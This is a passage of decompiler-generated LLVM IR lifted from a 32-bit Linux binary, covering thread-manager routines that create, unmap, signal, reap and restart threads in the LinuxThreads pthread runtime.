  %v12_804bb52 = or i32 %v0_804bb52, 3840
  store i32 %v12_804bb52, i32* %eax.global-to-local, align 4
  %v2_804bb55 = add i32 %v1_804bb51, -8
  %v3_804bb55 = inttoptr i32 %v2_804bb55 to i32*
  store i32 %v12_804bb52, i32* %v3_804bb55, align 4
  %v0_804bb56 = load i32, i32* @ebx, align 4
  %v2_804bb56 = add i32 %v1_804bb51, -12
  %v3_804bb56 = inttoptr i32 %v2_804bb56 to i32*
  store i32 %v0_804bb56, i32* %v3_804bb56, align 4
  %v1_804bb57 = add i32 %v1_804bb51, -16
  %v2_804bb57 = inttoptr i32 %v1_804bb57 to i32*
  store i32 134525966, i32* %v2_804bb57, align 4
  %v2_804bb5c = load i32, i32* %stack_var_-16, align 4
  %v5_804bb5c = call i32 @clone(i32 %arg1, i32 1, i32 %v2_804bb5c, i32 %v0_804b6cf)
  store i32 %v5_804bb5c, i32* %eax.global-to-local, align 4
  store i32 %v5_804bb5c, i32* @esi, align 4
  br label %dec_label_pc_804bb66

dec_label_pc_804bb66:                             ; preds = %dec_label_pc_804bb48, %dec_label_pc_804bb4c
  %v0_804bbf3 = phi i32 [ %v0_804bb48, %dec_label_pc_804bb48 ], [ %v5_804bb5c, %dec_label_pc_804bb4c ]
  %v10_804bb66 = icmp eq i32 %v0_804bbf3, -1
  %v1_804bb69 = icmp eq i1 %v10_804bb66, false
  %v1_804bbf3 = load i32, i32* @ebx, align 4
  br i1 %v1_804bb69, label %dec_label_pc_804bbf3, label %dec_label_pc_804bb6f

dec_label_pc_804bb6f:                             ; preds = %dec_label_pc_804bb66
  %v1_804bb6f = inttoptr i32 %v1_804bbf3 to i32*
  %v2_804bb6f = load i32, i32* %v1_804bb6f, align 4
  store i32 %v2_804bb6f, i32* %eax.global-to-local, align 4
  %v1_804bb71 = add i32 %v1_804bbf3, 4
  %v2_804bb71 = inttoptr i32 %v1_804bb71 to i32*
  %v3_804bb71 = load i32, i32* %v2_804bb71, align 4
  store i32 %v3_804bb71, i32* %edx.global-to-local, align 4
  %v0_804bb74 = load i32, i32* @edi, align 4
  %v1_804bb74 = icmp eq i32 %v0_804bb74, 0
  %v2_804bb76 = add i32 %v2_804bb6f, 4
  %v3_804bb76 = inttoptr i32 %v2_804bb76 to i32*
  store i32 %v3_804bb71, i32* %v3_804bb76, align 4
  %v0_804bb79 = load i32, i32* @ebx, align 4
  %v1_804bb79 = add i32 %v0_804bb79, 4
  %v2_804bb79 = inttoptr i32 %v1_804bb79 to i32*
  %v3_804bb79 = load i32, i32* %v2_804bb79, align 4
  store i32 %v3_804bb79, i32* @edx, align 4
  %v0_804bb7c = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb7c = inttoptr i32 %v3_804bb79 to i32*
  store i32 %v0_804bb7c, i32* %v2_804bb7c, align 4
  br i1 %v1_804bb74, label %dec_label_pc_804bb86, label %dec_label_pc_804bb80

dec_label_pc_804bb80:                             ; preds = %dec_label_pc_804bb6f
  %v0_804bb80 = load i32, i32* @edi, align 4
  %v1_804bb80 = add i32 %v0_804bb80, 24
  %v2_804bb80 = inttoptr i32 %v1_804bb80 to i32*
  %v3_804bb80 = load i32, i32* %v2_804bb80, align 4
  %v4_804bb80 = icmp eq i32 %v3_804bb80, 0
  %v1_804bb84 = icmp eq i1 %v4_804bb80, false
  br i1 %v1_804bb84, label %dec_label_pc_804bb80.dec_label_pc_804bbbd_crit_edge, label %dec_label_pc_804bb86

dec_label_pc_804bb80.dec_label_pc_804bbbd_crit_edge: ; preds = %dec_label_pc_804bb80
  %v0_804bbbd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bbbd

dec_label_pc_804bb86:                             ; preds = %dec_label_pc_804bb80, %dec_label_pc_804bb6f
  %v0_804bb86 = load i32, i32* @ebx, align 4
  %v1_804bb86 = add i32 %v0_804bb86, 400
  %v2_804bb86 = inttoptr i32 %v1_804bb86 to i32*
  %v3_804bb86 = load i32, i32* %v2_804bb86, align 4
  store i32 %v3_804bb86, i32* %eax.global-to-local, align 4
  %v1_804bb8c = icmp eq i32 %v3_804bb86, 0
  br i1 %v1_804bb8c, label %dec_label_pc_804bb86.dec_label_pc_804bba1_crit_edge, label %dec_label_pc_804bb90

dec_label_pc_804bb86.dec_label_pc_804bba1_crit_edge: ; preds = %dec_label_pc_804bb86
  %v1_804bba6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bba1

dec_label_pc_804bb90:                             ; preds = %dec_label_pc_804bb86
  %v0_804bb90 = load i32, i32* @ecx, align 4
  %v1_804bb90 = load i32, i32* @esp, align 4
  %v2_804bb90 = add i32 %v1_804bb90, -4
  %v3_804bb90 = inttoptr i32 %v2_804bb90 to i32*
  store i32 %v0_804bb90, i32* %v3_804bb90, align 4
  %v0_804bb91 = load i32, i32* @ecx, align 4
  %v2_804bb91 = add i32 %v1_804bb90, -8
  %v3_804bb91 = inttoptr i32 %v2_804bb91 to i32*
  store i32 %v0_804bb91, i32* %v3_804bb91, align 4
  %v2_804bb92 = add i32 %v1_804bb90, -12
  %v3_804bb92 = inttoptr i32 %v2_804bb92 to i32*
  store i32 %v3_804bb86, i32* %v3_804bb92, align 4
  %v0_804bb93 = load i32, i32* @ebx, align 4
  %v1_804bb93 = add i32 %v0_804bb93, 396
  %v2_804bb93 = inttoptr i32 %v1_804bb93 to i32*
  %v3_804bb93 = load i32, i32* %v2_804bb93, align 4
  %v5_804bb93 = add i32 %v1_804bb90, -16
  %v6_804bb93 = inttoptr i32 %v5_804bb93 to i32*
  store i32 %v3_804bb93, i32* %v6_804bb93, align 4
  %v2_804bb99 = load i32, i32* %stack_var_-16, align 4
  %v5_804bb99 = call i32 @munmap(i32 %arg1, i32 1, i32 %v2_804bb99, i32 %v0_804b6cf)
  store i32 %v5_804bb99, i32* %eax.global-to-local, align 4
  %v0_804bb9e = load i32, i32* @esp, align 4
  %v1_804bb9e = add i32 %v0_804bb9e, 16
  br label %dec_label_pc_804bba1

dec_label_pc_804bba1:                             ; preds = %dec_label_pc_804bb86.dec_label_pc_804bba1_crit_edge, %dec_label_pc_804bb90
  %v1_804bba6 = phi i32 [ %v1_804bba6.pre, %dec_label_pc_804bb86.dec_label_pc_804bba1_crit_edge ], [ %v1_804bb9e, %dec_label_pc_804bb90 ]
  %v0_804bba1 = load i32, i32* @global_var_80672b4.157, align 4
  store i32 %v0_804bba1, i32* %eax.global-to-local, align 4
  %v0_804bba6 = load i32, i32* @edx, align 4
  %v2_804bba6 = add i32 %v1_804bba6, -4
  %v3_804bba6 = inttoptr i32 %v2_804bba6 to i32*
  store i32 %v0_804bba6, i32* %v3_804bba6, align 4
  %v0_804bba7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bba7 = mul i32 %v0_804bba7, 4
  store i32 %v2_804bba7, i32* %eax.global-to-local, align 4
  %v0_804bbaa = load i32, i32* @edx, align 4
  %v2_804bbaa = add i32 %v1_804bba6, -8
  %v3_804bbaa = inttoptr i32 %v2_804bbaa to i32*
  store i32 %v0_804bbaa, i32* %v3_804bbaa, align 4
  %v0_804bbab = load i32, i32* @ebx, align 4
  %v1_804bbab = load i32, i32* %eax.global-to-local, align 4
  %v2_804bbab = sub i32 %v0_804bbab, %v1_804bbab
  store i32 %v2_804bbab, i32* @ebx, align 4
  %v2_804bbad = add i32 %v1_804bba6, -12
  %v3_804bbad = inttoptr i32 %v2_804bbad to i32*
  store i32 %v1_804bbab, i32* %v3_804bbad, align 4
  %v0_804bbae = load i32, i32* @ebx, align 4
  %v1_804bbae = add i32 %v0_804bbae, 480
  store i32 %v1_804bbae, i32* %eax.global-to-local, align 4
  %v2_804bbb4 = add i32 %v1_804bba6, -16
  %v3_804bbb4 = inttoptr i32 %v2_804bbb4 to i32*
  store i32 %v1_804bbae, i32* %v3_804bbb4, align 4
  %v2_804bbb5 = load i32, i32* %stack_var_-16, align 4
  %v5_804bbb5 = call i32 @munmap(i32 %arg1, i32 1, i32 %v2_804bbb5, i32 %v0_804b6cf)
  store i32 %v5_804bbb5, i32* %eax.global-to-local, align 4
  %v0_804bbba = load i32, i32* @esp, align 4
  %v1_804bbba = add i32 %v0_804bbba, 16
  br label %dec_label_pc_804bbbd

dec_label_pc_804bbbd:                             ; preds = %dec_label_pc_804bb80.dec_label_pc_804bbbd_crit_edge, %dec_label_pc_804bba1
  %v0_804bbbd = phi i32 [ %v0_804bbbd.pre, %dec_label_pc_804bb80.dec_label_pc_804bbbd_crit_edge ], [ %v1_804bbba, %dec_label_pc_804bba1 ]
  %v1_804bbbd = add i32 %v0_804bbbd, 20
  %v2_804bbbd = inttoptr i32 %v1_804bbbd to i32*
  %v3_804bbbd = load i32, i32* %v2_804bbbd, align 4
  %v2_804bbc1 = mul i32 %v3_804bbbd, 16
  store i32 %v2_804bbc1, i32* %eax.global-to-local, align 4
  %v1_804bbc4 = add i32 %v2_804bbc1, 134603528
  %v2_804bbc4 = inttoptr i32 %v1_804bbc4 to i32*
  store i32 0, i32* %v2_804bbc4, align 8
  %v0_804bbce = load i32, i32* %eax.global-to-local, align 4
  %v1_804bbce = add i32 %v0_804bbce, 134603532
  %v2_804bbce = inttoptr i32 %v1_804bbce to i32*
  store i32 0, i32* %v2_804bbce, align 4
  %v0_804bbd8 = load i32, i32* @global_var_8062300.148, align 256
  %v1_804bbdd = add i32 %v0_804bbd8, -1
  store i32 %v1_804bbdd, i32* %eax.global-to-local, align 4
  store i32 %v1_804bbdd, i32* @global_var_8062300.148, align 256
  %v1_804bbe3 = call i32 @__errno_location(i32 %arg1)
  store i32 %v1_804bbe3, i32* %eax.global-to-local, align 4
  %v1_804bbe8 = inttoptr i32 %v1_804bbe3 to i32*
  %v2_804bbe8 = load i32, i32* %v1_804bbe8, align 4
  store i32 %v2_804bbe8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bc03

dec_label_pc_804bbec:                             ; preds = %dec_label_pc_804b96f, %dec_label_pc_804b866
  store i32 11, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bc03

dec_label_pc_804bbf3:                             ; preds = %dec_label_pc_804bb66
  %v2_804bbf3 = add i32 %v1_804bbf3, 20
  %v3_804bbf3 = inttoptr i32 %v2_804bbf3 to i32*
  store i32 %v0_804bbf3, i32* %v3_804bbf3, align 4
  %v0_804bbf6 = load i32, i32* @esp, align 4
  %v1_804bbf6 = add i32 %v0_804bbf6, 4
  %v2_804bbf6 = inttoptr i32 %v1_804bbf6 to i32*
  %v3_804bbf6 = load i32, i32* %v2_804bbf6, align 4
  store i32 %v3_804bbf6, i32* %eax.global-to-local, align 4
  %v1_804bbfa = add i32 %v0_804bbf6, 16
  %v2_804bbfa = inttoptr i32 %v1_804bbfa to i32*
  %v3_804bbfa = load i32, i32* %v2_804bbfa, align 4
  %v2_804bbfe = add i32 %v3_804bbf6, 48
  %v3_804bbfe = inttoptr i32 %v2_804bbfe to i32*
  store i32 %v3_804bbfa, i32* %v3_804bbfe, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bc03

dec_label_pc_804bc03:                             ; preds = %dec_label_pc_804b854, %dec_label_pc_804bbec, %dec_label_pc_804bbbd, %dec_label_pc_804bbf3
  %v0_804bc07 = phi i32 [ 1, %dec_label_pc_804b854 ], [ 11, %dec_label_pc_804bbec ], [ %v2_804bbe8, %dec_label_pc_804bbbd ], [ 0, %dec_label_pc_804bbf3 ]
  %v0_804bc03 = load i32, i32* @esp, align 4
  %v1_804bc03 = add i32 %v0_804bc03, 4
  %v2_804bc03 = inttoptr i32 %v1_804bc03 to i32*
  %v3_804bc03 = load i32, i32* %v2_804bc03, align 4
  store i32 %v3_804bc03, i32* %ecx.global-to-local, align 4
  %v2_804bc07 = add i32 %v3_804bc03, 52
  %v3_804bc07 = inttoptr i32 %v2_804bc07 to i32*
  store i32 %v0_804bc07, i32* %v3_804bc07, align 4
  %v0_804bc0a = load i32, i32* @esp, align 4
  %v1_804bc0a = add i32 %v0_804bc0a, 48
  %v2_804bc0a = inttoptr i32 %v1_804bc0a to i32*
  %storemerge.pre = load i32, i32* %v2_804bc0a, align 4
  br label %dec_label_pc_804bceb

dec_label_pc_804bc13:                             ; preds = %dec_label_pc_804b7ea
  %v1_804bc13 = add i32 %v0_804b801, 72
  %v2_804bc13 = inttoptr i32 %v1_804bc13 to i32*
  %v3_804bc13 = load i32, i32* %v2_804bc13, align 4
  store i32 %v3_804bc13, i32* @edi, align 4
  store i32 0, i32* @edx, align 4
  %v1_804bc1b = urem i32 %v3_804bc13, 1024
  %v2_804bc20 = mul nuw nsw i32 %v1_804bc1b, 16
  %v1_804bc23 = add nuw nsw i32 %v2_804bc20, 134603520
  store i32 %v1_804bc23, i32* @esi, align 4
  store i32 %v1_804bc23, i32* @eax, align 4
  %v1_804bc2b = call i32 @__pthread_lock(i32 %arg1)
  store i32 %v1_804bc2b, i32* %eax.global-to-local, align 4
  %v0_804bc30 = load i32, i32* @esi, align 4
  %v1_804bc30 = add i32 %v0_804bc30, 8
  %v2_804bc30 = inttoptr i32 %v1_804bc30 to i32*
  %v3_804bc30 = load i32, i32* %v2_804bc30, align 4
  store i32 %v3_804bc30, i32* @ebx, align 4
  %v1_804bc33 = icmp eq i32 %v3_804bc30, 0
  br i1 %v1_804bc33, label %dec_label_pc_804bc5b, label %dec_label_pc_804bc37

dec_label_pc_804bc37:                             ; preds = %dec_label_pc_804bc13
  %v1_804bc37 = add i32 %v3_804bc30, 16
  %v2_804bc37 = inttoptr i32 %v1_804bc37 to i32*
  %v3_804bc37 = load i32, i32* %v2_804bc37, align 4
  %v4_804bc37 = load i32, i32* @edi, align 4
  %v15_804bc37 = icmp eq i32 %v3_804bc37, %v4_804bc37
  %v1_804bc3a = icmp eq i1 %v15_804bc37, false
  br i1 %v1_804bc3a, label %dec_label_pc_804bc5b, label %dec_label_pc_804bc3c

dec_label_pc_804bc3c:                             ; preds = %dec_label_pc_804bc37
  %v1_804bc3c = add i32 %v3_804bc30, 46
  %v2_804bc3c = inttoptr i32 %v1_804bc3c to i8*
  %v3_804bc3c = load i8, i8* %v2_804bc3c, align 1
  %v4_804bc3c = icmp eq i8 %v3_804bc3c, 0
  br i1 %v4_804bc3c, label %dec_label_pc_804bc57, label %dec_label_pc_804bc42

dec_label_pc_804bc42:                             ; preds = %dec_label_pc_804bc3c
  %v0_804bc42 = load i32, i32* @esp, align 4
  %v2_804bc45 = add i32 %v0_804bc42, -16
  %v3_804bc45 = inttoptr i32 %v2_804bc45 to i32*
  store i32 %v0_804bc30, i32* %v3_804bc45, align 4
  %v2_804bc46 = call i32 @__pthread_unlock(i32* %v1_804bc5f)
  %v0_804bc4b = load i32, i32* @ebx, align 4
  store i32 %v0_804bc4b, i32* @eax, align 4
  %v0_804bc4d = call i32 @pthread_free()
  store i32 %v0_804bc4d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd26

dec_label_pc_804bc57:                             ; preds = %dec_label_pc_804bc3c
  %v1_804bc57 = add i32 %v3_804bc30, 45
  %v2_804bc57 = inttoptr i32 %v1_804bc57 to i8*
  store i8 1, i8* %v2_804bc57, align 1
  %v0_804bc5e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bc5b

dec_label_pc_804bc5b:                             ; preds = %dec_label_pc_804bc37, %dec_label_pc_804bc13, %dec_label_pc_804bc57
  %v0_804bc5e = phi i32 [ %v0_804bc30, %dec_label_pc_804bc37 ], [ %v0_804bc30, %dec_label_pc_804bc13 ], [ %v0_804bc5e.pre, %dec_label_pc_804bc57 ]
  %v0_804bc5b = load i32, i32* @esp, align 4
  %v2_804bc5e = add i32 %v0_804bc5b, -16
  %v3_804bc5e = inttoptr i32 %v2_804bc5e to i32*
  store i32 %v0_804bc5e, i32* %v3_804bc5e, align 4
  %v2_804bc5f = call i32 @__pthread_unlock(i32* %v1_804bc5f)
  store i32 %v2_804bc5f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd26

dec_label_pc_804bc69:                             ; preds = %dec_label_pc_804b7ea
  %v1_804bc69 = add i32 %v0_804b801, 64
  %v2_804bc69 = inttoptr i32 %v1_804bc69 to i32*
  %v3_804bc69 = load i32, i32* %v2_804bc69, align 4
  store i32 %v3_804bc69, i32* @ebx, align 4
  %v1_804bc6d = add i32 %v0_804b801, 72
  %v2_804bc6d = inttoptr i32 %v1_804bc6d to i32*
  %v3_804bc6d = load i32, i32* %v2_804bc6d, align 4
  store i32 %v3_804bc6d, i32* %eax.global-to-local, align 4
  store i32 1, i32* @global_var_8062ff8.159, align 8
  store i32 %v3_804bc6d, i32* @global_var_8062ffc.160, align 4
  %v1_804bc80 = inttoptr i32 %v3_804bc69 to i32*
  %v2_804bc80 = load i32, i32* %v1_804bc80, align 4
  store i32 %v2_804bc80, i32* @esi, align 4
  %v12_804bc9976 = icmp eq i32 %v2_804bc80, %v3_804bc69
  %v1_804bc9b77 = icmp eq i1 %v12_804bc9976, false
  br i1 %v1_804bc9b77, label %dec_label_pc_804bc84, label %dec_label_pc_804bc9d

dec_label_pc_804bc84:                             ; preds = %dec_label_pc_804bc69, %dec_label_pc_804bc84
  %v1_804bc8478 = phi i32 [ %v1_804bc96, %dec_label_pc_804bc84 ], [ %v1_804b801, %dec_label_pc_804bc69 ]
  %v0_804bc84 = load i32, i32* @ebp, align 4
  %v2_804bc84 = add i32 %v1_804bc8478, -4
  %v3_804bc84 = inttoptr i32 %v2_804bc84 to i32*
  store i32 %v0_804bc84, i32* %v3_804bc84, align 4
  %v0_804bc85 = load i32, i32* @ebp, align 4
  %v2_804bc85 = add i32 %v1_804bc8478, -8
  %v3_804bc85 = inttoptr i32 %v2_804bc85 to i32*
  store i32 %v0_804bc85, i32* %v3_804bc85, align 4
  %v0_804bc86 = load i32, i32* @global_var_80626ec.155, align 4
  %v2_804bc86 = add i32 %v1_804bc8478, -12
  %v3_804bc86 = inttoptr i32 %v2_804bc86 to i32*
  store i32 %v0_804bc86, i32* %v3_804bc86, align 4
  %v0_804bc8c = load i32, i32* @esi, align 4
  %v1_804bc8c = add i32 %v0_804bc8c, 20
  %v2_804bc8c = inttoptr i32 %v1_804bc8c to i32*
  %v3_804bc8c = load i32, i32* %v2_804bc8c, align 4
  %v5_804bc8c = add i32 %v1_804bc8478, -16
  %v6_804bc8c = inttoptr i32 %v5_804bc8c to i32*
  store i32 %v3_804bc8c, i32* %v6_804bc8c, align 4
  %v3_804bc8f = call i32 @kill(i32 %arg1, i32 1)
  store i32 %v3_804bc8f, i32* %eax.global-to-local, align 4
  %v0_804bc94 = load i32, i32* @esi, align 4
  %v1_804bc94 = inttoptr i32 %v0_804bc94 to i32*
  %v2_804bc94 = load i32, i32* %v1_804bc94, align 4
  store i32 %v2_804bc94, i32* @esi, align 4
  %v0_804bc96 = load i32, i32* @esp, align 4
  %v1_804bc96 = add i32 %v0_804bc96, 16
  %v1_804bc99.pre = load i32, i32* @ebx, align 4
  %v12_804bc99 = icmp eq i32 %v2_804bc94, %v1_804bc99.pre
  %v1_804bc9b = icmp eq i1 %v12_804bc99, false
  br i1 %v1_804bc9b, label %dec_label_pc_804bc84, label %dec_label_pc_804bc9d

dec_label_pc_804bc9d:                             ; preds = %dec_label_pc_804bc84, %dec_label_pc_804bc69
  %v1_804bc84.lcssa = phi i32 [ %v1_804b801, %dec_label_pc_804bc69 ], [ %v1_804bc96, %dec_label_pc_804bc84 ]
  %v0_804bc9d.lcssa = phi i32 [ %v2_804bc80, %dec_label_pc_804bc69 ], [ %v2_804bc94, %dec_label_pc_804bc84 ]
  %v1_804bc9d = inttoptr i32 %v0_804bc9d.lcssa to i32*
  %v2_804bc9d = load i32, i32* %v1_804bc9d, align 4
  store i32 %v2_804bc9d, i32* @ebx, align 4
  %v12_804bcb667 = icmp eq i32 %v2_804bc9d, %v0_804bc9d.lcssa
  %v1_804bcb868 = icmp eq i1 %v12_804bcb667, false
  br i1 %v1_804bcb868, label %dec_label_pc_804bca1, label %dec_label_pc_804bcba

dec_label_pc_804bca1:                             ; preds = %dec_label_pc_804bc9d, %dec_label_pc_804bca1
  %v1_804bca169 = phi i32 [ %v1_804bcb3, %dec_label_pc_804bca1 ], [ %v1_804bc84.lcssa, %dec_label_pc_804bc9d ]
  %v0_804bca1 = load i32, i32* @edi, align 4
  %v2_804bca1 = add i32 %v1_804bca169, -4
  %v3_804bca1 = inttoptr i32 %v2_804bca1 to i32*
  store i32 %v0_804bca1, i32* %v3_804bca1, align 4
  %v1_804bca2 = add i32 %v1_804bca169, -8
  %v2_804bca2 = inttoptr i32 %v1_804bca2 to i32*
  store i32 -2147483648, i32* %v2_804bca2, align 4
  %v1_804bca7 = add i32 %v1_804bca169, -12
  %v2_804bca7 = inttoptr i32 %v1_804bca7 to i32*
  store i32 0, i32* %v2_804bca7, align 4
  %v0_804bca9 = load i32, i32* @ebx, align 4
  %v1_804bca9 = add i32 %v0_804bca9, 20
  %v2_804bca9 = inttoptr i32 %v1_804bca9 to i32*
  %v3_804bca9 = load i32, i32* %v2_804bca9, align 4
  %v5_804bca9 = add i32 %v1_804bca169, -16
  %v6_804bca9 = inttoptr i32 %v5_804bca9 to i32*
  store i32 %v3_804bca9, i32* %v6_804bca9, align 4
  %v2_804bcac = load i32, i32* %stack_var_-16, align 4
  %v5_804bcac = call i32 @waitpid(i32 %arg1, i32 1, i32 %v2_804bcac, i32 %v0_804b6cf)
  store i32 %v5_804bcac, i32* %eax.global-to-local, align 4
  %v0_804bcb1 = load i32, i32* @ebx, align 4
  %v1_804bcb1 = inttoptr i32 %v0_804bcb1 to i32*
  %v2_804bcb1 = load i32, i32* %v1_804bcb1, align 4
  store i32 %v2_804bcb1, i32* @ebx, align 4
  %v0_804bcb3 = load i32, i32* @esp, align 4
  %v1_804bcb3 = add i32 %v0_804bcb3, 16
  %v1_804bcb6.pre = load i32, i32* @esi, align 4
  %v12_804bcb6 = icmp eq i32 %v2_804bcb1, %v1_804bcb6.pre
  %v1_804bcb8 = icmp eq i1 %v12_804bcb6, false
  br i1 %v1_804bcb8, label %dec_label_pc_804bca1, label %dec_label_pc_804bcba

dec_label_pc_804bcba:                             ; preds = %dec_label_pc_804bca1, %dec_label_pc_804bc9d
  %v0_804bcba.lcssa = phi i32 [ %v2_804bc9d, %dec_label_pc_804bc9d ], [ %v2_804bcb1, %dec_label_pc_804bca1 ]
  store i32 %v0_804bcba.lcssa, i32* @eax, align 4
  %v0_804bcbc = call i32 @restart()
  br label %dec_label_pc_804bcc1

dec_label_pc_804bcc1:                             ; preds = %dec_label_pc_804b7b7, %dec_label_pc_804bcba
  %storemerge1 = phi i32 [ %v0_804bcbc, %dec_label_pc_804bcba ], [ %v0_804b7bb, %dec_label_pc_804b7b7 ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  %v0_804bcc1 = load i32, i32* @esp, align 4
  %v1_804bcc4 = add i32 %v0_804bcc1, -16
  %v2_804bcc4 = inttoptr i32 %v1_804bcc4 to i32*
  store i32 0, i32* %v2_804bcc4, align 4
  %v1_804bcc6 = call i32 @__GI__exit(i32 %arg1)
  unreachable

dec_label_pc_804bccb:                             ; preds = %dec_label_pc_804b7ea
  store i32 1, i32* @global_var_8062ea8.142, align 8
  %v0_804bcd5 = call i32 @pthread_reap_children()
  %v0_804bcda = load i32, i32* bitcast (i32** @global_var_80626e0.144 to i32*), align 32
  store i32 %v0_804bcda, i32* %eax.global-to-local, align 4
  store i32 %v0_804bcda, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bceb

dec_label_pc_804bceb:                             ; preds = %dec_label_pc_804bc03, %dec_label_pc_804bccb
  %storemerge = phi i32 [ %v0_804bcda, %dec_label_pc_804bccb ], [ %storemerge.pre, %dec_label_pc_804bc03 ]
  store i32 %storemerge, i32* @eax, align 4
  %v0_804bceb = call i32 @restart()
  store i32 %v0_804bceb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b793thread-pre-split

dec_label_pc_804bcf5:                             ; preds = %dec_label_pc_804b7ea
  %v1_804bcf8 = add i32 %v0_804b801, 72
  %v2_804bcf8 = inttoptr i32 %v1_804bcf8 to i32*
  %v3_804bcf8 = load i32, i32* %v2_804bcf8, align 4
  %v6_804bcf8 = inttoptr i32 %v0_804b801 to i32*
  store i32 %v3_804bcf8, i32* %v6_804bcf8, align 4
  %v0_804bcfc = call i32 @__new_sem_post()
  store i32 %v0_804bcfc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd26

dec_label_pc_804bd26:                             ; preds = %dec_label_pc_804bcf5, %dec_label_pc_804bc5b, %dec_label_pc_804bc42
  %v0_804bd26 = load i32, i32* @esp, align 4
  %v1_804bd26 = add i32 %v0_804bd26, 16
  br label %dec_label_pc_804b793

; uselistorder directives
  uselistorder i32 %v2_804bcb1, { 1, 0, 2 }
  uselistorder i32 %v2_804bc9d, { 1, 0, 2 }
  uselistorder i32 %v2_804bc94, { 1, 0, 2 }
  uselistorder i32 %v2_804bc80, { 1, 0, 2 }
  uselistorder i32 %v2_804bbc1, { 1, 0 }
  uselistorder i32 %v1_804bbf3, { 2, 1, 0 }
  uselistorder i32 %v0_804bbf3, { 1, 0 }
  uselistorder i32 %v12_804bb52, { 1, 0 }
  uselistorder i32 %v0_804bb1c, { 1, 0 }
  uselistorder i32 %v5_804bb0d, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_804ba38, { 1, 0 }
  uselistorder i32 %v1_804b978, { 3, 2, 1, 0 }
  uselistorder i32 %v3_804b86e, { 1, 0 }
  uselistorder i32 %v0_804b86e, { 1, 0 }
  uselistorder i32 %v1_804b921, { 1, 0 }
  uselistorder i32 %v2_804b901, { 1, 0 }
  uselistorder i32 %v1_804b8f3, { 0, 1, 2, 3, 4, 5, 7, 6, 8 }
  uselistorder i32 %tmp49, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804b8d2, { 1, 0, 2 }
  uselistorder i32 %v2_804b880, { 1, 0 }
  uselistorder i32 %v0_804b86e90, { 2, 0, 1 }
  uselistorder i32 %v0_804b82c, { 1, 0, 2 }
  uselistorder i32 %v1_804b801, { 1, 2, 0 }
  uselistorder i32 %v0_804b801, { 7, 6, 3, 4, 5, 0, 1, 2, 8, 9 }
  uselistorder i32 %v0_804b7e0, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_804b7dd, { 1, 0 }
  uselistorder i32 %v1_804b793, { 5, 4, 3, 2, 1, 0 }
  uselistorder i16* %v4_804baa6, { 1, 0 }
  uselistorder i32* %v1_804bc5f, { 2, 1, 0 }
  uselistorder i32 %v2_804b6eb, { 3, 2, 1, 5, 4, 0, 7, 6, 9, 8, 10 }
  uselistorder i32 %v0_804b6cf, { 0, 6, 5, 1, 2, 7, 4, 3 }
  uselistorder i32 %v0_804b6ce, { 1, 0 }
  uselistorder i32 %v0_804b6cd, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 11, 5, 6, 10, 9, 2, 3, 1, 0, 7, 8, 4, 12 }
  uselistorder i32* %edx.global-to-local, { 19, 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20 }
  uselistorder i32* %eax.global-to-local, { 0, 70, 71, 92, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 91, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 73, 68, 69, 93, 94, 95, 72, 74, 76, 75, 77, 78, 79, 81, 80, 82, 83, 85, 84, 86, 88, 87, 89, 90 }
  uselistorder i32 ()* @restart, { 1, 2, 0 }
  uselistorder i32 ()* @pthread_free, { 1, 0 }
  uselistorder i32 ()* @pthread_reap_children, { 1, 0 }
  uselistorder i32* @global_var_8062ea4.141, { 1, 2, 3, 0, 4 }
  uselistorder i32 %arg1, { 16, 17, 18, 15, 6, 7, 5, 8, 3, 4, 9, 1, 2, 0, 12, 13, 19, 20, 10, 11, 14, 23, 22, 21 }
  uselistorder label %dec_label_pc_804bceb, { 1, 0 }
  uselistorder label %dec_label_pc_804bcc1, { 1, 0 }
  uselistorder label %dec_label_pc_804bca1, { 1, 0 }
  uselistorder label %dec_label_pc_804bc84, { 1, 0 }
  uselistorder label %dec_label_pc_804bc5b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bc03, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804bbbd, { 1, 0 }
  uselistorder label %dec_label_pc_804bba1, { 1, 0 }
  uselistorder label %dec_label_pc_804bb66, { 1, 0 }
  uselistorder label %dec_label_pc_804bb48, { 1, 0 }
  uselistorder label %dec_label_pc_804ba89, { 1, 0 }
  uselistorder label %dec_label_pc_804ba80, { 1, 0 }
  uselistorder label %dec_label_pc_804ba7d, { 1, 0 }
  uselistorder label %dec_label_pc_804b978, { 1, 0 }
  uselistorder label %dec_label_pc_804b8eb, { 1, 0 }
  uselistorder label %dec_label_pc_804b8e7, { 1, 0 }
  uselistorder label %dec_label_pc_804b87c, { 1, 0 }
  uselistorder label %dec_label_pc_804b7dd, { 1, 0 }
  uselistorder label %dec_label_pc_804b793, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b793thread-pre-split, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804b731, { 2, 0, 1 }
}

define i32 @__pthread_manager_event(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @edx, align 4
  %v0_804bd33 = load i32, i32* bitcast (i32** @global_var_806251c.162 to i32*), align 4
